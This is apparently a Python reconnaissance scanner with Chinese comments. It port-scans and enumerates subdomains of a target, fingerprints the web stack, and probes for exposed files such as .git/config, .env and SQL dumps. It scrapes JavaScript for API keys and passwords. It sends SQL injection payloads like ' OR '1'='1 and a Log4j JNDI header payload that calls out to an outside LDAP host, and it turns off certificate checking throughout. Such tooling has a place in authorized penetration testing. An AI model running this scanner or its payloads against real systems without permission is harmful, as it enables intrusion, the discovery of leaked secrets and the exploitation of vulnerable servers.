#!/usr/bin/env python3
"""
全量智能侦察引擎 - 无外部依赖版本
完全使用Python标准库实现
"""

import re
import json
import subprocess
import urllib.request
import urllib.error
import ssl
import socket
import os
from typing import Dict, List, Optional
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# 创建不验证SSL的上下文
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE


class FullReconEngine:
    """全量侦察引擎"""
    
    def __init__(self, target: str):
        self.target = target
        self.results = {
            "target": target,
            "start_time": datetime.now().isoformat(),
            "findings": [],
            "assets": {},
            "vulnerabilities": []
        }
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    
    def run_full_scan(self) -> Dict:
        """执行全量扫描"""
        print(f"\n🔥 开始全量侦察: {self.target}")
        
        # 1. 基础信息收集
        print("\n[1/10] 基础信息收集...")
        self._basic_info()
        
        # 2. 端口扫描
        print("[2/10] 端口扫描...")
        self._port_scan()
        
        # 3. 子域名枚举
        print("[3/10] 子域名枚举...")
        self._subdomain_enum()
        
        # 4. Web指纹识别
        print("[4/10] Web指纹识别...")
        self._web_fingerprint()
        
        # 5. 目录扫描
        print("[5/10] 目录扫描...")
        self._directory_scan()
        
        # 6. JS文件分析
        print("[6/10] JS文件分析...")
        self._js_analysis()
        
        # 7. 敏感文件探测
        print("[7/10] 敏感文件探测...")
        self._sensitive_files()
        
        # 8. 漏洞检测
        print("[8/10] 漏洞检测...")
        self._vulnerability_scan()
        
        # 9. WAF检测
        print("[9/10] WAF检测...")
        self._waf_detection()
        
        # 10. 生成报告
        print("[10/10] 生成报告...")
        self._generate_summary()
        
        self.results["end_time"] = datetime.now().isoformat()
        print("\n✅ 全量侦察完成!")
        
        return self.results
    
    def _basic_info(self):
        """基础信息收集"""
        domain = self.target.replace("https://", "").replace("http://", "").split("/")[0]
        
        # DNS解析
        try:
            ip = socket.gethostbyname(domain)
            self.results["assets"]["ip"] = ip
            print(f"  IP: {ip}")
        except:
            pass
        
        # Whois (如果可用)
        try:
            result = subprocess.run(["whois", domain], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                self.results["assets"]["whois"] = result.stdout[:500]
        except:
            pass
    
    def _port_scan(self):
        """端口扫描"""
        domain = self.target.replace("https://", "").replace("http://", "").split("/")[0]
        
        # 常见端口
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080, 8443]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((domain, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        
        self.results["assets"]["open_ports"] = open_ports
        print(f"  开放端口: {open_ports}")
    
    def _subdomain_enum(self):
        """子域名枚举"""
        domain = self.target.replace("https://", "").replace("http://", "").split("/")[0]
        
        # 使用subfinder
        try:
            result = subprocess.run(
                ["subfinder", "-d", domain, "-silent"],
                capture_output=True,
                text=True,
                timeout=60
            )
            if result.returncode == 0:
                subdomains = [s.strip() for s in result.stdout.split('\n') if s.strip()]
                self.results["assets"]["subdomains"] = subdomains[:50]  # 限制50个
                print(f"  子域名: {len(subdomains)}")
        except:
            print("  subfinder不可用")
    
    def _web_fingerprint(self):
        """Web指纹识别"""
        try:
            req = urllib.request.Request(self.target, headers=self.headers)
            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
                headers = dict(response.headers)
                content = response.read().decode('utf-8', errors='ignore')
            
            fingerprints = {}
            
            # 服务器
            if 'Server' in headers:
                fingerprints['server'] = headers['Server']
            
            # 框架
            if 'X-Powered-By' in headers:
                fingerprints['framework'] = headers['X-Powered-By']
            
            # Shiro
            if 'rememberMe=deleteMe' in headers.get('Set-Cookie', ''):
                fingerprints['shiro'] = 'detected'
                self.results["vulnerabilities"].append({
                    "type": "Shiro反序列化",
                    "severity": "high",
                    "description": "检测到Shiro框架，可能存在反序列化漏洞"
                })
            
            # Spring Boot
            if 'spring' in content.lower():
                fingerprints['spring'] = 'detected'
            
            # jQuery
            if 'jquery' in content.lower():
                fingerprints['jquery'] = 'detected'
            
            self.results["assets"]["fingerprints"] = fingerprints
            print(f"  指纹: {list(fingerprints.keys())}")
            
        except Exception as e:
            print(f"  指纹识别失败: {e}")
    
    def _directory_scan(self):
        """目录扫描"""
        common_dirs = [
            '/admin', '/login', '/api', '/backup', '/test', 
            '/upload', '/files', '/images', '/js', '/css',
            '/config', '/data', '/logs', '/tmp'
        ]
        
        found_dirs = []
        for dir_path in common_dirs:
            try:
                url = f"{self.target.rstrip('/')}{dir_path}"
                req = urllib.request.Request(url, headers=self.headers)
                with urllib.request.urlopen(req, timeout=3, context=ssl_context) as response:
                    if response.status == 200:
                        found_dirs.append(dir_path)
            except:
                pass
        
        self.results["assets"]["directories"] = found_dirs
        print(f"  发现目录: {len(found_dirs)}")
    
    def _js_analysis(self):
        """JS文件分析"""
        try:
            req = urllib.request.Request(self.target, headers=self.headers)
            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
                content = response.read().decode('utf-8', errors='ignore')
            
            # 提取JS文件
            js_files = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', content)
            js_files = list(set(js_files))[:20]  # 限制20个
            
            api_endpoints = []
            sensitive_info = []
            
            # 分析JS文件
            for js_file in js_files[:5]:  # 只分析前5个
                try:
                    if not js_file.startswith('http'):
                        js_url = f"{self.target.rstrip('/')}/{js_file.lstrip('/')}"
                    else:
                        js_url = js_file
                    
                    req = urllib.request.Request(js_url, headers=self.headers)
                    with urllib.request.urlopen(req, timeout=5, context=ssl_context) as response:
                        js_content = response.read().decode('utf-8', errors='ignore')
                    
                    # 提取API端点
                    endpoints = re.findall(r'["\']/(api|admin|user)/[^"\']+["\']', js_content)
                    api_endpoints.extend(endpoints)
                    
                    # 检测敏感信息
                    if re.search(r'api[_-]?key', js_content, re.IGNORECASE):
                        sensitive_info.append("可能包含API Key")
                    if re.search(r'password', js_content, re.IGNORECASE):
                        sensitive_info.append("可能包含密码")
                    
                except:
                    pass
            
            self.results["assets"]["js_files"] = js_files
            self.results["assets"]["api_endpoints"] = list(set(api_endpoints))[:20]
            self.results["assets"]["sensitive_info"] = list(set(sensitive_info))
            
            print(f"  JS文件: {len(js_files)}, API端点: {len(api_endpoints)}")
            
        except Exception as e:
            print(f"  JS分析失败: {e}")
    
    def _sensitive_files(self):
        """敏感文件探测"""
        sensitive_paths = [
            '/.git/config', '/.env', '/.DS_Store', '/web.config',
            '/.svn/entries', '/backup.zip', '/backup.sql', '/dump.sql',
            '/phpinfo.php', '/info.php', '/test.php', '/config.php'
        ]
        
        found_files = []
        for path in sensitive_paths:
            try:
                url = f"{self.target.rstrip('/')}{path}"
                req = urllib.request.Request(url, headers=self.headers)
                with urllib.request.urlopen(req, timeout=3, context=ssl_context) as response:
                    if response.status == 200:
                        found_files.append(path)
                        self.results["vulnerabilities"].append({
                            "type": "敏感文件暴露",
                            "severity": "medium",
                            "description": f"发现敏感文件: {path}"
                        })
            except:
                pass
        
        self.results["assets"]["sensitive_files"] = found_files
        print(f"  敏感文件: {len(found_files)}")
    
    def _vulnerability_scan(self):
        """漏洞检测"""
        # SQL注入检测（基础）
        test_url = self.target
        if '?' in test_url:
            try:
                # 简单的错误注入测试
                test_payloads = ["'", '"', "' OR '1'='1"]
                for payload in test_payloads:
                    modified_url = test_url + payload
                    req = urllib.request.Request(modified_url, headers=self.headers)
                    with urllib.request.urlopen(req, timeout=5, context=ssl_context) as response:
                        content = response.read().decode('utf-8', errors='ignore')
                        # 检测SQL错误
                        if any(err in content.lower() for err in ['sql', 'mysql', 'syntax error']):
                            self.results["vulnerabilities"].append({
                                "type": "SQL注入",
                                "severity": "high",
                                "description": "可能存在SQL注入漏洞"
                            })
                            break
            except:
                pass
        
        # Log4j检测
        try:
            test_headers = self.headers.copy()
            test_headers['X-Api-Version'] = '${jndi:ldap://test.com/a}'
            req = urllib.request.Request(self.target, headers=test_headers)
            urllib.request.urlopen(req, timeout=5, context=ssl_context)
        except:
            pass
        
        print(f"  漏洞: {len(self.results['vulnerabilities'])}")
    
    def _waf_detection(self):
        """WAF检测"""
        try:
            req = urllib.request.Request(self.target, headers=self.headers)
            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
                headers = dict(response.headers)
            
            waf_indicators = {
                "Cloudflare": ["cloudflare", "cf-ray"],
                "Akamai": ["akamai"],
                "AWS WAF": ["x-amzn"],
                "F5 BIG-IP": ["bigip", "f5"]
            }
            
            detected_waf = None
            for waf_name, indicators in waf_indicators.items():
                for indicator in indicators:
                    if any(indicator in str(v).lower() for v in headers.values()):
                        detected_waf = waf_name
                        break
                if detected_waf:
                    break
            
            self.results["assets"]["waf"] = detected_waf or "未检测到"
            print(f"  WAF: {self.results['assets']['waf']}")
            
        except Exception as e:
            print(f"  WAF检测失败: {e}")
    
    def _generate_summary(self):
        """生成摘要"""
        summary = {
            "total_findings": len(self.results["findings"]),
            "total_vulnerabilities": len(self.results["vulnerabilities"]),
            "high_risk": len([v for v in self.results["vulnerabilities"] if v.get("severity") == "high"]),
            "medium_risk": len([v for v in self.results["vulnerabilities"] if v.get("severity") == "medium"]),
            "low_risk": len([v for v in self.results["vulnerabilities"] if v.get("severity") == "low"])
        }
        
        self.results["summary"] = summary
        print(f"\n📊 总结:")
        print(f"  漏洞总数: {summary['total_vulnerabilities']}")
        print(f"  高危: {summary['high_risk']}, 中危: {summary['medium_risk']}, 低危: {summary['low_risk']}")


if __name__ == "__main__":
    engine = FullReconEngine("https://example.com")
    results = engine.run_full_scan()
    print(json.dumps(results, indent=2, ensure_ascii=False))
